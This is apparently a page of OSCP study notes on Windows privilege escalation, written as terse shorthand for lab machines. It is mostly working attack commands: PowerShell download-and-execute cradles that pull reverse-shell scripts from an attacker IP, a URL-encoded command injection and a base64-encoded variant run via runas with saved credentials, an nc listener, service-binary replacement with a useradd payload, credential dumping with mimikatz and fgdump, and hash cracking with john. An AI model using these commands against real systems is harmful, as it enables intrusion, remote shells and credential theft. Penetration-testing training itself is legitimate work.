---
title: Windows Privilege Escalation
slug: windows-privilege-escalation
last_modified_at: 2019-11-01T16:20:02-05:00
category: Certifications
tags: OSCP
Authors: Daniel Haggerty
---


```
icacls scsiaccess.exe
...
Everyone: (I)(F)
```
crosscompile useradd.c
i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
wce -w
fgdump.exe
type 127.0.0.1.pwdump
john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
Is there python on dev windows machine
Use pyinstaller on dev windows machine
python pyinstaller.py --onefile ms11-080.py
Check for powershell
powershell whoami
whaomi /priv
cmdkey /list
run an exploit suggesters
If web server poke around databasel
Check if I can write in folder
echo PleaseSubsribe > test
1. Nishang
2. unicorn → meterpreter from a standard shell
UPGRADE TO NISHANG 1. Locate the PS > Invoke...reverse shell line in script and put at bottom so it executes in memory after transfer
2. Server python -m SimpleHTTPServer 80
3. powershell “IEX(New-Object NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1')”
net user dan dan /add; net local
UNICORN
Exploit suggesters • Sherlock.ps1
• Powerup.ps1 → service misconfigs
• Exploit suggester ./windows-exploit-suggester.py
python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt
• jaws-enum.ps1
• Empire??
Sherlock.ps1
windows-exploit-suggester.py
Empire
PowerUp.ps1
46/67
locate PowerUp.ps1. Copy then add “Invoke-AllChecks” to end
http://10.10.10.9/ippsec.php?fexec=echo%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.11:8000/
PowerUp.ps1%27)%20|%20powershell%20-noprofile%20-
Run Invokes from memory as the file transferred
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/jaws-enum.ps1')"
1. jaws-enum.ps1 JAWS enumeration
Currently stored credentials:
Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator
BURP (ctr-U to url encode the following)
%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object
NetWebClient).downloadString('http://10.10.14.7:8000/InvokePowerShellTcp.ps1').}
powershell -ExecutionPolicy Bypass -File xyz.ps1
group Administrators dan /add
rdesktop 10.10.10.10 -u dan
2. jaws-enum.ps1 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/jaws-enum.ps1')"
JAWS enumeration
Currently stored credentials:
Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator
PS C:\Users\Public\Desktop> dir
"ZKAccess3.5 Security System.lnk"
GET FILE CONTENTS SO WE KNOW HOW TO RUN AS ADMIN
get-Content "ZKAccess3.5 Security System.lnk" == linux “file”
$WScript = New-Object -ComObject Wscript.Shell
$shortcut = Get-ChildItem *.lnk
$Wscript.CreateShortcut($shortcut)
FullName : C:\Users\Public\Desktop\ZKAccess3.5
Security System.lnk
Arguments : /user:ACCESS\Administrator /savecred
"C:\ZKTeco\ZKAccess3.5\Access.exe"
Description :
Hotkey :
IconLocation : C:\ZKTeco\ZKAccess3.5\img\AccessNET.
ico,0
RelativePath :
TargetPath : C:\Windows\System32\runas.exe
WindowStyle : 1
WorkingDirectory : C:\ZKTeco\ZKAccess3.5
runas /user:ACCESS\Administrator /savecred whoami
This string 'http://10.10.14.3:8000/9002.ps1'
To this encoding prior to base64
--to-code UTF-16LE
Full command in kali
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/9002.ps1')" | iconv --to-code UTF-16LE |
47/67
base64 -w 0
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgB
Set up listener on KALI
nc -nlvp 9002
runas /user:ACCESS\Administrator /savecred "Powershell -EncodedCommand
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgB
Use mimikatz
Need write access to download, go to your users desktop
(New-Object Net.WebClient).DownloadFile('http://10.10.14.7:8000/mimikatz.exe', 'mimkatz.exe')
didnt work
tried from telnet sessiondir
powershell "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.7:8000/mimikatz.exe', 'mimkatz.exe')
not recog as command
github Generic-AppLockerbypasses.md
Empire Chatterbox
Look at original nmap scan for other shite running (nmap localhost)
check permissions on webserver echo PleaseSubscribe > test
FAILS
Directory: C:\inetpub\wwwroot
Mode LastWriteTime Length Name
---- ------------- ------ ----
d---- 8/21/2018 11:30 PM aspnet_cli
ent
-a--- 8/24/2018 12:33 AM 391 index.html
-a--- 8/24/2018 8:39 PM 88712 out.jpg
PASSWORDS cmdkey /list - is a stored pw
Currently stored credentials:
Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator
→ Use Mimikatz
48/67
KERNEL EXPLOITS If no service packs or Hotfixes then possibly vulnerable to kernel exploits
pgdump.exe, pwdump.exe, fgdump.exe
type 127.0.0.1 pwdump
wce32.exe -w
wce64.exe -w
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords # gets passwords
Hashed passwords
https://crackstation.net
https://hashkiller.co.uk
john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
https://pentestlab.blog/2017/04/24/windows-kernel-exploits/
